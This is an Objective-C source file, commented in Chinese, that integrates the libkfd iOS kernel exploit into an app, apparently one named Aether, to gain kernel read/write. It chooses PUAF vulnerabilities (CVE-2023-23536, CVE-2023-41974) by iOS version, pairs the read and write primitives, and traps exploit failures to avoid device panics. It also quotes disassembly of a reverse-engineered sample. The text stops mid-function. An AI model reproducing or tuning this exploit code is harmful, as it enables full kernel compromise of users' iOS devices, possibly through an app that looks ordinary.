//
//  KernelMemory.m
//  内核内存读写层实现。
//
//  ⚠️ 整个工程只有本文件可以 #include "libkfd.h"：
//     libkfd 是 header-only，且 kopen / kread / kwrite / kclose 都是非 static 定义，
//     第二个 include 点会撞重复符号。别的文件一律走 KernelMemory.h 的 C 接口。
//
//  数据流（对齐样本 _kfd_port/施工总纲.md）：
//      kopen
//        └─ info_init    读 kern.version → 选版本表项
//        └─ puaf_run     PUAFF 制造悬空 PTE（不碰目标进程）
//        └─ krkw_run     用半随机游走拿到 psemnode，建立 kread / kwrite
//        └─ info_run     kread 反查 current_proc / kernel_proc
//        └─ <perf_run 已按本路线关闭：不读 kernelcache__* 静态表>
//      之后：从 kernel_proc 向下页对齐扫 MH_MAGIC_64 → kernel base
//
//  全程不调用 task_for_pid，不使用 mach_vm_read。
//

#import <Foundation/Foundation.h>
#include <sys/sysctl.h>
/* 自检里用 _mh_execute_header 拿本进程 Mach-O 头，它定义在 <mach-o/ldsyms.h>。 */
#include <mach-o/ldsyms.h>

#include "KernelMemory.h"
#include "libkfd.h"

#pragma mark - 状态

/// kopen 返回的句柄。0 表示未就绪。
static uint64_t g_handle = 0;

/*
 * 对外就绪标志，与 g_handle 分开。
 *
 * g_handle 一赋上，内部那几个步骤（定位线性映射）就都跑得动了，
 * 所以它必须尽早发布；但"内部能跑"不等于"对外可用"。
 * km_ready() 若直接返回 g_handle != 0，则 km_init 还在同一个线程里跑
 * km_locate_linear_map（内部有页表 walk）的时候，别的线程就能从
 * km_ready() 拿到 true 并开始并发 kread。
 *
 * 而 libkfd 的后端不是线程安全的：kread_sem_open 每次读都要改写自己
 * psemnode 的 pinfo，kwrite_sem_open 与 kread 共用同一块 krkw_method_data。
 * 并发进去会让内核写入落到非预期地址 —— 那正是 vm_map 被写坏的形态。
 *
 * 所以拆成两个：g_handle 负责"内部可用"，g_kernel_ready 负责"对外可用"，
 * 后者只在 km_init 全程走完之后才置位。
 */
static bool g_kernel_ready = false;

/*
 * km_init 是否已经**尝试过**（成功与失败都算）。
 *
 * 为什么不能拿 g_handle 当这个守卫：PUAFF 失败时 km_init 在 g_handle 上留下 0，
 * 于是下一次调用会认为"还没跑过"，把整轮 PUAFF 在**已经不一致的 vm_map**
 * 上再跑一遍。这正是 kfd_try_open 里刚拆掉的那个放大器（见本文件
 * "只清用户态的 posix semaphore 对象，然后直接放弃，不重试"那段注释）——
 * 拆掉 kopen 层的重试、却让更高一层的 km_init 把同样的事再做一次，等于没拆。
 *
 * 所以单独记一个"跑过没有"：失败也置位，之后一律走 no-op。要重试就交给
 * 下一次进程启动，那时 vm_map 是干净的（与 kfd_try_open 是同一条理由）。
 */
static bool g_init_attempted = false;

/// 扫描得到的 kernel base（kernelcache 的 MH_MAGIC_64 所在地址）。
static uint64_t g_kernel_base = 0;

#pragma mark - 失败回退（对齐 kfd-mcp-ipad 的 kfd_glue_abort）

/*
 * 上游 kfd 的 assert 失败会 sleep(30) 再 exit(1)。对 Aether 这种长驻 app，
 * 那意味着「一次 PUAFF 没落地 = 进程猝死」，而且它 sleep 的那 30 秒正好
 * 把残留状态留在原地，下一次启动接着撞。
 *
 * 这里注册一个 longjmp 处理器，把失败降级成 kopen 返回 0：
 * 应用可以干净地报错、不写内核、也不留下半截状态。
 */
kfd_assert_handler_t kfd_assert_handler = NULL;
struct kfd_assert_site kfd_assert_last = { NULL, 0, NULL };

/// kopen 的 setjmp 落点。只有 kfd_try_open 在跑时非 NULL。
static jmp_buf g_kopen_jmp;
static bool g_kopen_jmp_armed = false;

/*
 * 断言失败的详情，直接给面板用。
 *
 * 为什么不只用 NSLog：设备日志要 Console.app 或 idevicesyslog 才看得到，
 * 而断言失败的行号正是排查的唯一线索。把它塞进 km_init 的 err（面板首行）
 * 才能让人一眼看到是 libkfd 的哪一步失守。
 * 静态缓冲区：*why 的生命周期只需覆盖调用方读取那一次。
 */
static char g_kopen_abort_detail[256];

/// 断言失败时由 common.h 的 assert 宏调用：不退出，跳回调用方。
static void km_assert_fallback(void)
{
    if (g_kopen_jmp_armed) {
        longjmp(g_kopen_jmp, 1);
    }
    /* 没武装（不在 kopen 调用窗口内）就交回 assert 的原路径。 */
}

/**
 * 包一层 kopen：把「库内断言失败」从「进程猝死」降级成「返回 0」。
 *
 * 注意这里**不重试**。失败的 kopen 会在内核侧留下 PUAFF 残留（悬空 PTE、
 * 半裁开的 vm_map 条目），而 sem_unlink 只清得掉用户态那个 semaphore 名字，
 * 清不掉内核侧残留。在残留之上再跑一次 PUAFF，等于对已经不一致的 vm_map
 * 再插一次 —— 失败概率是累积的，不是独立的。
 * 想再试，交给下一次进程启动：那时 vm_map 是干净的。
 */
static uint64_t kfd_try_open(u64 puaf_pages, u64 puaf_method, u64 read_method, u64 write_method,
                             const char **why)
{
    kfd_assert_handler = km_assert_fallback;

    g_kopen_jmp_armed = true;
    if (setjmp(g_kopen_jmp) == 0) {
        uint64_t fd = kopen(puaf_pages, puaf_method, read_method, write_method);
        g_kopen_jmp_armed = false;
        if (fd != 0) {
            return fd;
        }
        if (why) {
            *why = "kopen returned 0 (PUAFF did not land)";
        }
    } else {
        /* longjmp 回来：断言失败现场已记在 kfd_assert_last。 */
        g_kopen_jmp_armed = false;
        NSLog(@"[KernelMemory] kopen aborted at %s:%d (%s)",
              kfd_assert_last.file ? kfd_assert_last.file : "?",
              kfd_assert_last.line,
              kfd_assert_last.cond ? kfd_assert_last.cond : "?");
        if (why) {
            /*
             * 把行号一起交给调用方 —— 面板首行会显示它。
             * 只给"assert failed"等于什么都没说：libkfd 里有几十条 assert，
             * 不指明哪一条就没法往下查。
             */
            snprintf(g_kopen_abort_detail, sizeof(g_kopen_abort_detail),
                     "kopen 断言失败 %s:%d (%s)",
                     kfd_assert_last.file ? kfd_assert_last.file : "?",
                     kfd_assert_last.line,
                     kfd_assert_last.cond ? kfd_assert_last.cond : "?");
            *why = g_kopen_abort_detail;
        }
    }

    /*
     * 只清用户态的 posix semaphore 对象，然后**直接放弃**，不重试。
     *
     * 这里刻意做成"一次失败即终止本次会话"：
     *  - sem_unlink 只能清掉用户态那个 semaphore 名字，清不掉 kopen 内部
     *    已经动过的内核侧 PUAFF 残留（悬空 PTE、半裁开的 vm_map 条目）。
     *  - 在残留之上再跑一次 PUAFF，等于对同一个已经不一致的 vm_map 再插一次
     *    —— panic 概率不是三次独立失败，而是随次数累积上升。
     *  - 上游 README 的立场也是"失败就停"，清理责任在 PUAFF 自己的 cleanup，
     *    而不是靠重试掩盖。
     *
     * 想重试就交给下一次进程启动：那时 vm_map 是干净的。
     */
    sem_unlink("kfd-posix-semaphore");

    return 0;
}

/// 当前进程 pmap 的内核地址（info_run 反查得到）。
static uint64_t g_current_pmap = 0;
/// 「内核 VA − PA」差值。经自校验后才有意义。
static uint64_t g_linear_delta = 0;
static bool g_linear_map_valid = false;

/*
 * ============ 全局不变式：g_linear_map_valid 是 g_linear_delta 的唯一有效位 ============
 *
 *     !g_linear_map_valid  ⟹  g_linear_delta == 0
 *
 * 这条不变式是全文件读路径安全的前提，必须由**每一个写入点**共同维持：
 *   · 写入点 ①：km_locate_linear_map 入口 —— 两个全局同时复位（valid=false / delta=0）；
 *   · 写入点 ②：km_bootstrap_linear_delta —— **不写 delta**（本次止损改掉的那一行，
 *                它曾经把 tte − ttep 写进全局，而那个值只是顶层表所在**那一段**的
 *                偏移，见该函数注释里的两次 panic 证据）；
 *   · 写入点 ③：km_compute_linear_delta —— 成功才写，且只有调用者随后置 valid=true
 *                才算生效；任何失败分支（含 >>40 形态判据不过）必须把 delta 复位为 0。
 *
 * 为什么「valid 为 false 时 delta 必须是 0」而不是「随便什么值都行」：
 *   看 km_page_table_walk / km_pte_for 的下钻那一行 ——
 *       table = (entry & KM_TTE_PA_MASK) + g_linear_delta;
 *   delta == 0 时它退化成 `table = entry & KM_TTE_PA_MASK`，而 KM_TTE_PA_MASK
 *   （0x0000fffffffff000）的**高 16 位恒为 0**，于是 km_is_kernel_address 的
 *   `(addr >> 48) == 0xFFFF` 必定为假、km_read64 当场返回 ok=false ——
 *   这是**安全失败**（4d863fc 时代之所以没出事，正是因为那时根本不存在
 *   bootstrap，delta 恒为 0，每条下钻都被这道形态检查拦掉）。
 *   而一个「看似合法的错值」（比如 tte − ttep 落进 0xfffffe… 区）会让
 *   km_is_kernel_address **放行**，内核随即抱着一个未映射地址去解引用 ——
 *   那就是第二次彩屏的形态（far = 0xfffffe1564a385b4 ≥ VM_MIN_KERNEL_ADDRESS、
 *   esr DFSC=6 level 2 fault，打在地址空间的空洞里）。
 *   一句话：**0 会被形态检查拦下，错值不会；所以"更危险"恰恰是"更不容易被发现"。**
 *
 * 注意这道不变式**不能**靠"某个闸门检查了 g_linear_map_valid"来替代：
 * 闸门只挡被检查的那一处，写进全局的脏值会沿着别的读者扩散 —— 这正是
 * b581819 那次止损漏掉的那条（闸门补齐了，污染源没堵）。
 */

/// struct pmap 的 tte 字段偏移。static_info.h 里 pmap 以 tte/ttep 开头。
#define KM_PMAP_TTE_OFFSET 0x00

/// PUAFF 页数。
///
/// 回到 2048（kfd README 的示例值 / 上游 ContentView 的默认档）。
///
/// 之前改成 512 是基于对样本的离线模拟推断（样本按
/// hw.cpufamily + hw.memsize + os_proc_available_memory 在
/// {128,160,256,512,3072} 里挑）。那个推断有两个问题：
///   1. 模拟当时读到 kwrite_method = 0（合法域是 0/1/2），说明模拟状态不完整、
///      走的分支未必是真实路径；
///   2. 样本的 kfd 是自建 physrw 路径（mach_memory_object_memory_entry_64 +
///      vm_remap 自建窗口 + physrw_pte），与上游 libkfd 的 PUAF→KRKW 路线不同，
///      它的页数选择不能直接搬到这条路上。
///
/// 改回 2048 的直接依据是这次设备上的失败点：
///   kopen 报 assert failed，最可能落在 krkw.h:222 的 assert_false(krkw_type)
///   —— 那一行是「在 PUAF 页里没搜到目标内核对象（psemnode / fileproc）」。
///   而 krkw.h:142 的 grabbed_puaf_pages_goal = number_of_puaf_pages / 4，
///   512 页会先被「抓走」128 页（上游自称这是浪费 25% 的粗暴启发式），
///   只剩 384 页可搜。上游文档对此有明确结论：
///     "a higher number of PUAF pages makes it easier for the rest of the
///      exploit to achieve a kernel read/write primitive"
///   2048 时抓走 512、剩 1536 页，是 512 情形下可搜页数的 4 倍。
///
/// 关于彩屏：页数与本轮之前那三次 panic **没有因果关系**。panic 链是
/// perf_run 失败 → longjmp 跳过 puaf_cleanup → 残留 vm_map 被后续操作踩中，
/// 而那条链已经由 perf_supported = false 切断。页数只影响 KRKW 阶段的搜索
/// 成功率。kopen 自身断言范围为 16 ... 3072（实测），2048 位于其中。
static const u64 kfd_puaf_pages = 2048;

#pragma mark - 工具

bool km_is_kernel_address(uint64_t addr)
{
    return (addr >> 48) == 0xFFFF;
}

/// 读取 kern.version 全文。取不到返回 nil。
static NSString *km_read_kern_version(void)
{
    char buffer[512] = {};
    size_t size = sizeof(buffer);
    if (sysctlbyname("kern.version", buffer, &size, NULL, 0) != 0) {
        return nil;
    }
    return [NSString stringWithUTF8String:buffer];
}

/// 版本是否落在 dynamic_info.h 的 kern_versions[] 覆盖范围内。
///
/// kfd 的 info_init() 在匹配不到时走 assert_false()，在 app 里等于 exit(1)。
/// 所以这里先自己挡一次，把「不支持」变成一条可读错误而不是一次闪退。
/// 判定口径与 info_init 一致：比 Darwin 主次号前缀。
static BOOL km_version_is_listed(NSString *kernVersion)
{
    if (kernVersion.length == 0) {
        return NO;
    }

    const size_t prefixLength = 29; /* strlen("Darwin Kernel Version 22.5.0") */
    if (kernVersion.length < prefixLength) {
        return NO;
    }
    NSString *prefix = [kernVersion substringToIndex:prefixLength];

    const u64 count = sizeof(kern_versions) / sizeof(kern_versions[0]);
    for (u64 i = 0; i < count; i++) {
        const char *entry = kern_versions[i].kern_version;
        if (strncmp(prefix.UTF8String, entry, prefixLength) == 0) {
            return YES;
        }
    }
    return NO;
}

/**
 * 版本是否在 kfd 的**下界**之上。
 *
 * 与 km_version_is_listed 互补：
 *   km_version_is_listed    管"表里有没有"——负责上界（高于 16.6.1 无条目）
 *   km_version_is_supported 管"低于下限"——负责下界（iOS 13/14 没有可用 PUAFF）
 *
 * 两者缺一不可。本工程部署目标是 iOS 13.0（project.yml / Music.xcconfig /
 * Info.plist 的 MinimumOSVersion），所以 iOS 13/14 的设备**装得上**；但 kfd 的
 * 三个 PUAFF 都要 iOS 15 起才存在，且 dynamic_info.h 最早只到 Darwin 21。
 * 不挡这一道，那些设备会在 info_init 里撞 assert（app 直接闪退），而不是
 * 收到一句明确的话。
 */
static BOOL km_version_is_supported(const char **why)
{
    NSString *kernVersion = km_read_kern_version();
    if (kernVersion.length == 0) {
        /* 读不到 kern.version 说明环境异常，不冒险往下走。 */
        if (why) {
            *why = "无法读取 kern.version";
        }
        return NO;
    }

    NSString *marker = @"Darwin Kernel Version ";
    NSRange r = [kernVersion rangeOfString:marker];
    if (r.location == NSNotFound) {
        if (why) {
            *why = "kern.version 格式无法识别";
        }
        return NO;
    }

    /* 取 "22.4.0"，遇到非数字/非点的字符（通常是 ':'）即停。 */
    NSString *rest = [kernVersion substringFromIndex:NSMaxRange(r)];
    NSMutableString *num = [NSMutableString string];
    for (NSUInteger i = 0; i < rest.length; i++) {
        unichar ch = [rest characterAtIndex:i];
        if ((ch >= '0' && ch <= '9') || ch == '.') {
            [num appendFormat:@"%C", ch];
        } else {
            break;
        }
    }
    if (num.length == 0) {
        if (why) {
            *why = "kern.version 里解析不出 Darwin 版本号";
        }
        return NO;
    }

    NSInteger major = [[num componentsSeparatedByString:@"."] firstObject].integerValue;

    /*
     * 下界：Darwin 21（iOS 15.x）起才有可用 PUAFF。
     *
     * 但这里刻意把门槛抬到 Darwin 22（iOS 16.0）：iOS 15 虽然 PUAFF 存在，
     * 本工程却走不通它 —— iOS < 16 会被 @available(iOS 16.0, *) 分派到
     * kread_IOSurface / kwrite_IOSurface 后端（见下方 readMethod 与
     * writeMethod 的成对选择），而**这个后端在本工程没有任何真机验证**。
     *
     * 不是 0 偏移的问题，别再把理由写错：dynamic_info.h 里 Darwin 21 那条的
     * ios__* 五个偏移已经填了真值（0x360 / 0xac / 0xa4 / 0xc0 / 0x14，来自
     * opa334/kfd 的 IOSurface.h）。缺的是读原语本身的落实验证 ——
     * 那条后端依赖的 IOSurface kext 通道在 iOS 16 上被改过（见下方
     * "为什么 iOS 16 不能用 IOSurface"），而 iOS 15 侧的行为我们一次都没在
     * 设备上跑通：偏移表与读原语都只过了静态检查，没有端到端证据。
     *
     * 写侧同理：kwrite_IOSurface 必须与 kread_IOSurface 成对（见下方注释）。
     * 而且 iOS 15 这条组合**连 kopen 入口都过不去**，不必等到真机上才知道
     * —— 这一点先前写反了，按代码事实改正：
     *
     *   kwrite_IOSurface 是本工程给上游加的第三个写后端（libkfd.h:36），
     *   枚举值 = 2（kwrite_dup = 0 / kwrite_sem_open = 1，libkfd.h:33-37），
     *   而 kopen 入口那句范围断言是**从上游继承的 `<= kwrite_sem_open`**
     *   （libkfd.h:179），没有为新后端放宽。紧邻的上一行 libkfd.h:178 读侧
     *   已经是 `<= kread_IOSurface`（那个后端随样本一起进来，见 libkfd.h:30），
     *   写侧对不上 —— 两侧不对称，问题就出在这。
     *
     *   于是本工程在 KernelMemory.m:537 分派出的 writeMethod = kwrite_IOSurface
     *   落在断言外面：2 <= 1 为假，断言必挂。挂的形态不是崩溃而是可诊断的失败：
     *   common.h:139 的 assert 宏先打印
     *   "assertion failed: (kwrite_method <= kwrite_sem_open)"，再调用
     *   kfd_assert_handler —— 本工程已把它注册成 km_assert_fallback，
     *   于是 longjmp 回 kfd_try_open 的调用点，kopen 以返回 0 告终。
     *
     * 所以这一档的问题是双重的：原语没做过真机验证，**且结构上就走不通**。
     * 将来要放开 iOS 15，第一步是放宽 libkfd.h:179（或重排 537 那处 writeMethod
     * 的分派），否则任何 iOS 15 设备一进 kopen 就终止。
     *
     * 与其让客户在 iOS 15 上撞莫名其妙的失败、或者被半成品的 IOSurface
     * 写原语写坏内核，不如在这里明确拒绝：要放开这一档，先把 iOS 15 真机上的
     * kread/kwrite 跑通，目前没有这个证据。
     */
    if (major < 21) {
        if (why) {
            *why = "系统版本过低：kfd 的 PUAFF 从 iOS 15.0 起才存在（需要 iOS 16.0 及以上）";
        }
        return NO;
    }
    if (major == 21) {
        if (why) {
            *why = "iOS 15.x 暂不支持：本工程在 iOS 16 以下会走 IOSurface 读写后端，"
                   "而该后端尚未在本工程做过真机验证（需要 iOS 16.0 及以上）";
        }
        return NO;
    }

    return YES;
}

/*
 * 地址翻译层的前向声明。
 *
 * 两者定义在文件后部的「地址翻译层」一节，但 km_self_test 要先调用它们。
 * 不能依赖隐式声明 —— C 里那是错误，Clang 默认只是警告、很多配置下照样编过，
 * 但 `bool` 返回的函数会被当成返回 int，一旦被误判就悄悄出错。
 */
static bool km_page_table_walk(uint64_t pmap, uint64_t va, uint64_t *pa_out);
static bool km_pte_for(uint64_t pmap, uint64_t va, uint64_t *pte_pa_out);

#pragma mark - 对外接口

bool km_init(const char **err)
{
    if (err) {
        *err = NULL;
    }
    /*
     * 幂等守卫看"尝试过没有"，不看 g_handle。
     *
     * 原来的写法是 `if (g_handle != 0) return true;`，而 PUAFF 失败时那个值
     * **就是** 0 —— 于是第二遍调用不认为跑过，会把整轮 PUAFF 在已经不一致的
     * vm_map 上再跑一次（成因与后果见 g_init_attempted 的声明处）。
     *
     * 置位放在最前面，是为了让失败路径和提前 return 的路径（版本门、
     * kopen 返回 0）也一并覆盖 —— 只覆盖成功路径等于没修。
     * 更早跑过的调用返回的是"当前句柄是否有效"，不再假装成功：老写法在
     * 句柄已被关掉之后再调 km_init 也会返回 true，而那时 g_handle 已经是 0。
     */
    if (g_init_attempted) {
        return g_handle != 0;
    }
    g_init_attempted = true;

    NSString *kernVersion = km_read_kern_version();
    NSLog(@"[KernelMemory] kern.version = %@", kernVersion ?: @"(unreadable)");

    if (!km_version_is_listed(kernVersion)) {
        // 把 Darwin 主次号单独提出来放前面 —— 面板一行装不下整个 kern.version，
        // 尾部会被截断，而「哪个版本没覆盖」正是这一步唯一有用的信息。
        NSString *shortVer = @"(unreadable)";
        if (kernVersion != nil) {
            NSRange m = [kernVersion rangeOfString:@"Darwin Kernel Version "];
            if (m.location != NSNotFound) {
                NSString *rest = [kernVersion substringFromIndex:NSMaxRange(m)];
                NSMutableString *num = [NSMutableString string];
                for (NSUInteger i = 0; i < rest.length; i++) {
                    unichar ch = [rest characterAtIndex:i];
                    if ((ch >= '0' && ch <= '9') || ch == '.') {
                        [num appendFormat:@"%C", ch];
                    } else {
                        break;
                    }
                }
                if (num.length > 0) {
                    shortVer = [num copy];
                }
            } else {
                shortVer = [kernVersion substringToIndex:MIN((NSUInteger)29, kernVersion.length)];
            }
        }
        NSLog(@"[KernelMemory] version not listed: %@", shortVer);
        if (err) {
            static char errBuf[192];
            snprintf(errBuf, sizeof(errBuf),
                     "Darwin %s 不在 kern_versions[] 里（见 libkfd/info/dynamic_info.h）",
                     shortVer.UTF8String);
            *err = errBuf;
        }
        return false;
    }

    /*
     * PUAFF 按版本选。三个方法的适用范围来自 kfd 自己的 README：
     *   physpuppet = CVE-2023-23536  →  iOS 16.4 修复
     *   smith      = CVE-2023-32434  →  iOS 16.5.1 修复
     *   landa      = CVE-2023-41974  →  iOS 17.0 修复
     *
     * 但「没被修」不等于「能用」。README 里另有一句直接关系到设备安全：
     *
     *   "It sleeps for 30 seconds because the kernel might panic on exit for
     *    certain PUAF methods that require some cleanup post-KRKW
     *    (e.g. puaf_smith)."
     *
     * smith 破坏 VM 的 hole list，清理不成立时**内核 panic**（整个设备彩屏重启，
     * 不是 app 崩）。实测在 16.4.1 上用 smith 就是这个结果。
     *
     * 所以分区改成：
     *   15.x – 16.3    →  physpuppet（最简单、无清理风险）
     *   16.4 – 16.5    →  landa（smith 的窗口，但 smith 会 panic；landa 到 17.0
     *                            才修，在这个区间同样可用且不破坏 hole list）
     *   16.5.1 及以上  →  landa
     *
     * 也就是：**smith 一律不用**。它的收益（覆盖一个我们也能用 landa 的窄区间）
     * 完全抵不过每次失败换一次内核 panic 的代价。
     */
    u64 puafMethod;
    if (@available(iOS 16.4, *)) {
        puafMethod = puaf_landa;
    } else {
        puafMethod = puaf_physpuppet;
    }

    NSLog(@"[KernelMemory] puaf method = %s",
          (puafMethod == puaf_landa) ? "landa" : "physpuppet");

    /*
     * kread 后端按 iOS 版本分派 —— 与样本一致。
     *
     * 样本实测（见 _kfd_port/样本通道权威实测结论.md §kread 分派）：
     *   kopen 之前先做一次 @available(iOS 16.0, *) 检查，用它的结果
     *   二选一写进 kfd->kread_method：
     *       0x100F8FBD8  mov  w0, #2 / w1, #0x10 / w2, #0 / w3, #0
     *       0x100F8FBE8  bl   0x1010AFE1C     ; @available 包装
     *       0x100F8FBFC  cinc x8, x8, eq      ; -> 1 或 2
     *       0x100F8FC00  str  x8, [x19, #8]   ; kread_method
     *   枚举: kread_kqueue_workloop_ctl=0, kread_sem_open=1, kread_IOSurface=2
     *
     * 为什么 iOS 16 不能用 IOSurface：读原语被改了 —— userclient 方法不再
     * 返回目标处单个 32 位整数，而是返回相邻两个 32 位整数之和（Vertex 的
     * README 记载：arm64e 上还有更多 data PAC）。样本的 IOSurface 读路径里
     * 没有任何针对这个变化的补偿，且它的 ReadDisplacement 取的是 iOS 15 的
     * 值 0x14，所以那条路只在 iOS 15 成立。
     *
     * 证据：编译器只对 0x100F7B828（sem_open 的 kread）生成了去虚拟化守卫
     * （0x100F8BB48 cmp x9, x10），IOSurface 的 kread 实现一次都没有 ——
     * 说明编译期已知的那个 kread 实现是 sem_open。
     */
    u64 readMethod;
    if (@available(iOS 16.0, *)) {
        readMethod = kread_sem_open;
    } else {
        readMethod = kread_IOSurface;
    }

    /*
     * kwrite 侧必须与 kread 侧成对 —— 这不是风格问题，是正确性问题。
     *
     * kwrite_sem_open 是"搭车"实现：它把 kfd->kwrite.krkw_method_data 直接
     * 指向 kread 的缓冲（kwrite_sem_open_init 里那一行赋值），并按 i32 解释
     * 每个元素（文件描述符）。而 kread_IOSurface 的同一块缓冲里放的是 u64
     * 的 surface_id。混用时 deallocate 会把 surface_id 当 fd 去 close()、
     * free 也会用错误的 size 释放。
     *
     * opa334 的 kwrite_IOSurface.h 开头原话：
     *   "I attempted to make this standalone from kread but that probably
     *    doesn't work, so just select IOSurface for both kread and kwrite"
     *
     * 枚举顺序在两套里刻意对齐（dup 与 kqueue_workloop_ctl 都不参与），
     * 所以 IOSurface 侧 read/write 同为 2，sem_open 侧同为 1。
     */
    const u64 writeMethod = (readMethod == kread_IOSurface) ? kwrite_IOSurface
                                                            : kwrite_sem_open;

    /*
     * ── 版本门：不在 kfd 支持区间内就干净拒绝，不调 kopen ──
     *
     * 为什么必须有这道门：本工程的部署目标是 iOS 13.0（project.yml /
     * Music.xcconfig / Info.plist 的 MinimumOSVersion），也就是 iOS 13/14 的
     * 设备**能装上**。但 kfd 的三个 PUAFF 对应的是 iOS 15.0 起才存在的漏洞：
     *
     *   physpuppet = CVE-2023-23536   iOS 15.0 起
     *   smith      = CVE-2023-32434   iOS 16.4 起
     *   landa      = CVE-2023-41974   iOS 16.4 起
     *
     * 在 15.0 以下根本没有可用的 PUAFF，而且 dynamic_info.h 最早只覆盖到
     * Darwin 21；真的跑下去只会在 info_init 里撞 assert 或用到垃圾偏移。
     * 宁可在这里给一句明确的话，也不要让客户看到"打开就重启"。
     *
     * 15.0–16.6.1 是完整支持区间（对应 dynamic_info.h 的 Darwin 21 / 22）。
     */
    const char *verWhy = NULL;
    if (!km_version_is_supported(&verWhy)) {
        NSString *ver = [[NSProcessInfo processInfo] operatingSystemVersionString];
        if (err) {
            *err = verWhy ? verWhy : "iOS 版本不在 kfd 支持区间（16.0 – 16.6.1）";
        }
        NSLog(@"[KernelMemory] unsupported OS, refusing to run exploit: %@ (%@)",
              ver, verWhy ? [NSString stringWithUTF8String:verWhy] : @"?");
        return false;
    }

    /*
     * 到这一步就没有回头路了：kopen 里 PUAFF 一旦失败，可能让**内核** panic
     * （整个设备彩屏重启，不是 app 崩）。NSLog 进 unified log、会落盘，
     * 所以彩屏之后这一行是唯一还能查到的参数记录。
     */
    NSLog(@"[KernelMemory] kopen(pages=%llu, puaf=%s, kread=%s, kwrite=%s)",
          (unsigned long long)kfd_puaf_pages,
          (puafMethod == puaf_landa) ? "landa" : "physpuppet",
          (readMethod == kread_IOSurface) ? "IOSurface" : "sem_open",
          (writeMethod == kwrite_IOSurface) ? "IOSurface" : "sem_open");

    /*
     * 走 km 的失败回退：内核侧断言失败时 kopen 返回 0，而不是 sleep(30)+exit(1)。
     * 注意这只挡「库级失败」——如果 PUAFF 已经把 vm_map 写坏、内核自己 panic，
     * 用户态任何手段都拦不住，那需要靠不触发它来避免。
     */
    const char *openWhy = NULL;
    uint64_t handle = kfd_try_open(kfd_puaf_pages, puafMethod, readMethod, writeMethod, &openWhy);
    if (handle == 0) {
        if (err) {
            *err = openWhy ? openWhy : "kopen returned 0 (PUAFF did not land)";
        }
        return false;
    }

    struct kfd *kfd = (struct kfd *)handle;
    g_handle = handle;

    /*
     * ============ kopen 之后，km_init 里的每一处内核访问（逐条穷举）============
     *
     * kopen 返回到本函数结束之间，每一处会碰内核内存的地方都列在下面，
     * 并各自回答两个问题：**地址从哪来？基准不可信时它还安全吗？**
     * 写这份清单的目的不是留档，而是让下一个改这一层的人不必重新推一遍
     * "到底哪条路真的会把地址送进内核解引用"。顺序即执行顺序：
     *
     * ① 紧接着的那两行 NSLog 读 kfd->info.kaddr.* —— **不是内核访问**。
     *    kfd 是用户态结构，那些字段是 info_run 用 kread 填进去的缓存值。
     *    那之后 kernel base 只是一次纯用户态赋值（恒为 0），不是内核访问；
     *    "在未验证地址上连续盲扫"那条路已整段删除，不再出现在本清单里。
     *
     * ② km_locate_linear_map()，内部两段：
     *    ②-1 km_bootstrap_linear_delta —— 读 pmap + 0x00 / pmap + 0x08。
     *         地址是 g_current_pmap（info_run 反查出来的真 pmap），偏移是常量。
     *         它不依赖 delta；本次改动后它**不写任何全局**，
     *         算出来的 tte − ttep 只进诊断字符串。
     *         **这是 kopen 之后整个 km_init 里剩下的唯一两次内核读** ——
     *         所以特地说清它为什么不必再停用：它读的就是 `g_current_pmap + {0, 8}`，
     *         与 4d863fc 时代四条 walk 路径的第一级读**完全同一个地址**
     *         （那时没有 bootstrap，walk 自己就从这个 pmap 开始读，而那一版
     *         设备上没出现过 panic）—— 这一步的安全性不劣于历史基线；
     *         而它换回来的 tte / ttep 两个读数，是下次真出问题时**唯一**能
     *         反推"当时拿到的 pmap 长什么样"的证据。收益实、风险与基线同级，
     *         所以留着。真正危险的那些下钻/拼接已经被闸门挡在下面两步之外。
     *    ②-2 四条 km_compute_linear_delta —— 每条内部第一步是
     *         km_page_table_walk(pmap, kernel_proc 或 current_proc)，
     *         而 walk 的**入口闸门**在基准未验通时直接失败：
     *         所以这四条路径当前**一次 kread 都不发**（两条 `walk failed` 日志）。
     *         （将来闸门放开，它们才会去读 pmap 的 tte 与顶层表 entry，
     *          那两次读的地址都出自内核自身写下的数据。）
     *
     * ③ km_proc_for_pid(自己的 pid) —— **短路命中时**一次 kread 都不发：
     *    条件是 `pid == kfd->info.env.pid && current_proc`，命中就直接返回
     *    info_run 已经反查好的 current_proc。
     *    **但短路要求 current_proc 非 0**：若 info_run 没能反查出它，
     *    这个分支不成立 —— 而它原来会退化成的 p_list 链表遍历现已按
     *    KM_ENABLE_PLIST_WALK = 0 停用，所以那种情况下这里是**直接失败**
     *    （返回 0，并在 km_self_test 的 procForPid 行里说明原因）。
     *    也就是说：km_init 里现在**没有任何一条**会走链表遍历的路径了。
     *    余下的注意点是短路的那个前提必须成立：**current_proc 非 0**。
     *
     * ④ g_kernel_ready = true —— 纯用户态赋值。
     *
     * km_self_test **不在** km_init 里（AppDelegate 在 km_init 返回之后才调），
     * 它的内核访问单独列在那个函数里。
     *
     * 一句话结论：改完之后 km_init 里没有任何一条路径能把**错算**的地址
     * （delta 参与拼出来的那种）送进 km_read64 / kread —— 那条路已被两道闸门
     * 加污染源封死；而两处"不使用 delta、因此闸门管不到"的路径也各自处理了：
     * 盲扫那条已整段删除，②-1 保留（读的是 `g_current_pmap + {0, 8}`，
     * 与历史基线同址，且它换回的 tte / ttep 是唯一能反推 pmap 形态的证据），
     * ③ 的链表遍历停用。
     * **剩下的那一处"未经映射验证"的读**必须写明，不能算已经解决：
     *   · ②-1 里 bootstrap 对 pmap + {0, 8} 的两次诊断读。
     * 它的前提是"地址来自内核自己写下的数据 + 形态检查能挡住多数坏值"，
     * 缺的仍是一件东西：**证明某个地址确实已映射**的手段（ptov_table 等价物）。
     * 那不能用一次相减或一个形态检查补出来。
     */
    NSLog(@"[KernelMemory] current_proc = %#llx  kernel_proc = %#llx",
          (unsigned long long)kfd->info.kaddr.current_proc,
          (unsigned long long)kfd->info.kaddr.kernel_proc);

    /*
     * kernel base 恒为 0：反向扫描（唯一一处"在未验证地址上连续盲扫"的内核访问）
     * 已经整段删除，g_kernel_base 不再有任何写入点。它现在只喂诊断：km_kernel_base()
     * 的调用方 AppDelegate.swift 打印 "kbase=0x..."，以及 km_self_test 里那行
     * magic 检查（恒走 "skipped (no kernel base)"）。没有任何功能依赖它 ——
     * 地址翻译走的是 pmap 与页表，不经过 kernel base。
     */
    g_kernel_base = 0;
    NSLog(@"[KernelMemory] kernel base = %#llx (scan removed)", (unsigned long long)g_kernel_base);

    if (g_kernel_base == 0) {
        /*
         * 读写原语已经可用，只是没有 kernelcache 头。这不影响 kread/kwrite
         * 本身，所以不当作初始化失败 —— kernel base 的消费者可以自行降级。
         */
